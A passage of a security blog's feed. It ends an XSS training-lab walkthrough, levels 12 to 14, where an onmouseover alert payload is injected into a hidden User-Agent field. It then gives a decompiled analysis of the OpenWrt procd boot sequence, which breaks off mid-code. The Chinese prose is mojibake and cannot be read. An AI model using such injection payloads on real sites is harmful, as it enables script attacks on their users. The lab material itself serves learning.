src=level12.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰uaæ®µï¼Œæ˜¾ç„¶æ˜¯ç”¨æˆ·ä¿¡æ¯ï¼Œå› æ­¤BPä¿®æ”¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_cook&quot;</span>  value=<span class="string">&quot;call me maybe?&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°t_sortå’Œt_cookå¯ä»¥é€šè¿‡GETSä¼ å‚ï¼Œä½†æ˜¯t_cookçš„åŸç†æœªçŸ¥</p><p>BPæŠ“åŒ…å‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=call+me+maybe%<span class="number">7F</span></span><br></pre></td></tr></table></figure><p>Cookieçš„userå­—æ®µä¾¿æ˜¯t_cookçš„æ¥æº</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>çœ‹æºç å‘ç°ç½‘ç«™è²Œä¼¼æ˜¯æŒ‚äº†çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSSå­¦ä¹ &quot;&gt;&lt;a href=&quot;#XSSå­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;XSSå­¦ä¹ &quot;&gt;&lt;/a&gt;XSSå­¦ä¹ &lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰</summary>
      
    
    
    
    <category term="Webå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web" scheme="http://s1nec-1o.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹</title>
    <link href="http://s1nec-1o.github.io/2025/01/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    <id>http://s1nec-1o.github.io/2025/01/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</id>
    <published>2025-01-04T05:20:30.000Z</published>
    <updated>2025-01-04T05:49:33.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹"><a href="#openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹" class="headerlink" title="openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹"></a>openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åªåšäº†å¤§è‡´æµç¨‹çš„åˆ†æ</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡&#x2F;etc&#x2F;rc.dä¸‹çš„é“¾æ¥æ‰§è¡Œ**&#x2F;etc&#x2F;init.d**ä¸‹çš„åˆå§‹åŒ–æœåŠ¡ï¼Œä¸è¿‡æœ‰çš„å›ºä»¶å¹¶æ²¡æœ‰init.dç›®å½•ï¼Œå› æ­¤è¿˜æ˜¯å¾—ç‰¹æ®Šæƒ…å†µç‰¹æ®Šçœ‹å¾…</p><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p><strong>&#x2F;sbin&#x2F;init-&gt;ç¬¬ä¸€æ¬¡&#x2F;sbin&#x2F;procd-&gt;&#x2F;sbin&#x2F;preinit-&gt;ç¬¬äºŒæ¬¡&#x2F;sbin&#x2F;procd</strong></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h2 id="sbin-init"><a href="#sbin-init" class="headerlink" title="&#x2F;sbin&#x2F;init"></a>&#x2F;sbin&#x2F;init</h2><p>é¦–å…ˆç¬¬ä¸€ä¸ªå¯åŠ¨çš„ç¨‹åºä¾¿æ˜¯&#x2F;sbin&#x2F;initåˆå§‹åŒ–ç¨‹åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigaction</span>(<span class="number">15</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(<span class="number">10</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">sigaction</span>(<span class="number">12</span>, &amp;asc_1244C, <span class="number">0</span>);</span><br><span class="line">  v4 = <span class="built_in">sub_9110</span>(v3);</span><br><span class="line">  <span class="built_in">sub_903C</span>(v4);</span><br><span class="line">  v5 = <span class="built_in">sub_9C04</span>(<span class="number">1</span>);</span><br><span class="line">  v6 = <span class="built_in">uloop_init</span>(v5);</span><br><span class="line">  v7 = <span class="built_in">sub_94D0</span>(v6);</span><br><span class="line">  <span class="built_in">uloop_run</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sub-9110"><a href="#sub-9110" class="headerlink" title="sub_9110"></a>sub_9110</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_9110</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> v2; <span class="comment">// [sp+8h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0x400</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0x400</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0x406</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/run&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/lock&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/tmp/state&quot;</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="built_in">symlink</span>(<span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;/var&quot;</span>);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0x400</span>u, <span class="string">&quot;mode=0755,size=512K&quot;</span>);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/shm&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">    <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">    <span class="built_in">mount</span>(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0x400</span>u, <span class="string">&quot;mode=600&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_98F0</span>(<span class="string">&quot;*&quot;</span>, <span class="number">384</span>);</span><br><span class="line">    <span class="built_in">mknod</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">0x1B6</span>u, <span class="number">0x103</span>uLL);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;PATH&quot;</span>, <span class="string">&quot;/bin:/sbin:/usr/bin:/usr/sbin&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">stat</span>(<span class="string">&quot;/dev/console&quot;</span>, &amp;v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to stat %s\n&quot;</span>, <span class="string">&quot;/dev/console&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Failed to stat %s\n&quot;</span>, <span class="string">&quot;/dev/console&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="built_in">open</span>(<span class="string">&quot;/dev/console&quot;</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">        v1 = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">dup2</span>(v1, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="built_in">close</span>(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Console is alive\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(<span class="string">&quot;procd: Console is alive\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¦æ±‚å½“å‰ç¨‹åºçš„pidä¸º1ï¼Œåœ¨ä»¿çœŸæ—¶ï¼Œæˆ–è®¸å¯ä»¥ç›´æ¥æŠŠå…¶patchæ‰ï¼ŒæŒ‚è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œåˆ›å»ºç›®å½•å’Œç¬¦å·é“¾æ¥ï¼Œè®¾ç½®æ¨¡å¼ï¼Œå¤§å°å’Œæƒé™ï¼Œä¹‹åè°ƒç”¨sub_98F0å‡½æ•°</p><h4 id="sub-98F0"><a href="#sub-98F0" class="headerlink" title="sub_98F0"></a>sub_98F0</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_98F0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r4</span></span><br><span class="line">  _DWORD v8[<span class="number">7</span>]; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = a2;                                   <span class="comment">// 0x180</span></span><br><span class="line">  v8[<span class="number">1</span>] = a3;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">chdir</span>(<span class="string">&quot;/dev&quot;</span>) )                          <span class="comment">// è®¾ç½®å½“å‰å·¥ä½œç›®å½•ä¸º/devï¼Œå¤±è´¥è¿”å›1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);                              <span class="comment">// *</span></span><br><span class="line">  v7 = <span class="built_in">malloc</span>(v6 + <span class="number">2</span>);</span><br><span class="line">  *v7 = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v7 + <span class="number">1</span>, a1);</span><br><span class="line">  v8[<span class="number">0</span>] = v7;                                   <span class="comment">// &amp;(**)</span></span><br><span class="line">  addrxx = (<span class="type">int</span>)v8;</span><br><span class="line">  dword_144A4 = <span class="number">1</span>;</span><br><span class="line">  dword_12460 = a2;</span><br><span class="line">  <span class="built_in">sub_9688</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sub_9688</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„sub_9688å‡½æ•°ï¼Œæ˜¯ä¸ºäº†éå†æŒ‡å®šç›®å½•ï¼Œè¯»å–ç¬¦å·é“¾æ¥ï¼ŒåŒ¹é…ç‰¹å®šæ¨¡å¼ï¼Œå¹¶åˆ›å»ºç›¸åº”çš„è®¾å¤‡èŠ‚ç‚¹ã€‚</p><ol><li><strong>å‚æ•°ä¸º 0ï¼š</strong><ul><li>è·¯å¾„ä¸º <code>/sys/dev/char</code>ã€‚</li><li>åˆ›å»ºå­—ç¬¦è®¾å¤‡èŠ‚ç‚¹ï¼ˆ<code>v14 = 0x2000</code>ï¼‰ã€‚</li></ul></li><li><strong>å‚æ•°ä¸º 1ï¼š</strong><ul><li>è·¯å¾„ä¸º <code>&quot;/sys/dev/block&quot;</code>ã€‚</li><li>åˆ›å»ºå—è®¾å¤‡èŠ‚ç‚¹ï¼ˆ<code>v14 = 24576</code>ï¼Œå³ <code>0x6000</code>ï¼‰ã€‚</li></ul></li></ol><h3 id="sub-903C"><a href="#sub-903C" class="headerlink" title="sub_903C"></a>sub_903C</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_903C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1016</span>]; <span class="comment">// [sp+8h] [bp-440h] BYREF</span></span><br><span class="line">  <span class="type">regex_t</span> v3; <span class="comment">// [sp+408h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">regmatch_t</span> v4; <span class="comment">// [sp+428h] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+430h] [bp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+434h] [bp-14h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">open</span>(<span class="string">&quot;/proc/cmdline&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[<span class="built_in">read</span>(v0, buf, <span class="number">0x3FF</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">close</span>(v1);</span><br><span class="line">    <span class="built_in">regcomp</span>(&amp;v3, <span class="string">&quot;init_debug=([0-9]+)&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">regexec</span>(&amp;v3, buf, <span class="number">2u</span>, &amp;v4, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      buf[v6] = <span class="number">0</span>;</span><br><span class="line">      dword_12474 = <span class="built_in">atoi</span>(&amp;buf[v5]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">regfree</span>(&amp;v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°çš„ä½œç”¨æ˜¯è§£æå†…æ ¸å‘½ä»¤è¡Œå‚æ•°ï¼Œæå– <code>init_debug</code> çš„å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å…¨å±€å˜é‡ <code>dword_12474</code> ä¸­</p><h3 id="sub-9C04"><a href="#sub-9C04" class="headerlink" title="sub_9C04"></a>sub_9C04</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_9C04</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  FILE *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">getenv</span>(<span class="string">&quot;WDTFD&quot;</span>);</span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">if</span> ( dword_12464 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_144B4 = (<span class="type">int</span>)sub_9980;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Watchdog handover: fd=%s\n&quot;</span>, result);</span><br><span class="line">        <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Watchdog handover: fd=%s\n&quot;</span>, <span class="string">&quot;watchdog_init&quot;</span>, <span class="number">103</span>, v3);</span><br><span class="line">      &#125;</span><br><span class="line">      dword_12464 = <span class="built_in">atoi</span>(v3);</span><br><span class="line">      result = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">unsetenv</span>(<span class="string">&quot;WDTFD&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dword_12464 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = dword_12464;</span><br><span class="line">    <span class="keyword">if</span> ( dword_12464 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="built_in">fcntl</span>(dword_12464, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">fcntl</span>(v4, <span class="number">2</span>, v5 | <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- watchdog -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - watchdog -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_9A84</span>(<span class="number">30</span>);</span><br><span class="line">      result = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_9980</span>(&amp;unk_144A8);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="built_in">sub_9A84</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Opened watchdog with timeout %ds\n&quot;</span>, v6);</span><br><span class="line">        v7 = (FILE *)stderr;</span><br><span class="line">        v8 = <span class="built_in">sub_9A84</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">fprintf</span>(v7, <span class="string">&quot;procd: %s(%d): Opened watchdog with timeout %ds\n&quot;</span>, <span class="string">&quot;watchdog_init&quot;</span>, <span class="number">120</span>, v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–çœ‹é—¨ç‹—è®¡æ—¶å™¨</p><h3 id="sub-94D0"><a href="#sub-94D0" class="headerlink" title="sub_94D0"></a>sub_94D0</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_94D0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *file[<span class="number">4</span>]; <span class="comment">// [sp+Ch] [bp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v6[<span class="number">11</span>]; <span class="comment">// [sp+1Ch] [bp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="string">&quot;/etc/preinit&quot;</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  file[<span class="number">0</span>] = <span class="string">&quot;/sbin/procd&quot;</span>;</span><br><span class="line">  file[<span class="number">1</span>] = <span class="string">&quot;-h&quot;</span>;</span><br><span class="line">  file[<span class="number">2</span>] = <span class="string">&quot;/etc/hotplug-preinit.json&quot;</span>;</span><br><span class="line">  file[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- preinit -\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">&quot;procd: - preinit -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  dword_12484 = (<span 